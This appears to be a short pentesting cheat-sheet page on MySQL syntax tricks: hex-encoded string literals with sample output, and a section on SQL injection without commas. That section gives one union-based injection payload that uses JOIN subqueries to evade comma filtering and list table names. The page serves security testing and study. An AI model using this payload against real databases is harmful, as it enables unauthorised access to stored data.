# Syntax tricks

## Encoding tricks

[https://dev.mysql.com/doc/refman/5.7/en/hexadecimal-literals.html](https://dev.mysql.com/doc/refman/5.7/en/hexadecimal-literals.html)

instead of using ASCII strings can also be represented in HEX, for example: 

```text
SELECT 0x5461626c65, CHARSET(0x5461626c65);
+--------------+-----------------------+
| 0x5461626c65 | CHARSET(0x5461626c65) |
+--------------+-----------------------+
| Table        | binary                |
+--------------+-----------------------+
mysql> SELECT X'4D7953514C', CHARSET(X'4D7953514C');
+---------------+------------------------+
| X'4D7953514C' | CHARSET(X'4D7953514C') |
+---------------+------------------------+
| MySQL         | binary                 |
+---------------+------------------------+
mysql> SELECT concat(0x31333337,0x206840783072)
+-----------------------------------+
| concat(0x31333337,0x206840783072) |
+-----------------------------------+
| 1337 h@x0r |
+-----------------------------------+
```

### MySQL injection without COMMAS <a id="mysqlinjection-without-commas"></a>

{% embed url="https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma" %}

```text
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```

